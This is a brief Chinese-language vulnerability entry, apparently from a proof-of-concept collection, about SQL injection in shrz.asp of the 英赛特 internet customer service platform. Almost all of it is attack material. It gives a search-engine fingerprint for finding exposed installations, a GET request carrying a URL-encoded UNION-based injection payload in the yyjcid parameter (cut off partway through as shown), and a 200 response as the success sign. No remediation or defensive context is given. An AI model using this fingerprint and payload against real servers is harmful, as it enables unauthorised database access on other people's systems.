# 英赛特互联网客户服务平台shrz.asp存在SQL注入漏洞

英赛特互联网客户服务平台shrz.asp ｜ SQL注入 ｜ —
- **指纹**：`body="inc/js/pngfix.js"`
- **请求**：`GET /csccmise/shrz.asp?yyjcid=123%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28CASE%20WHEN%20%28SYSDATETIME%28%29%3DSYSDATE`
- **响应特征**：200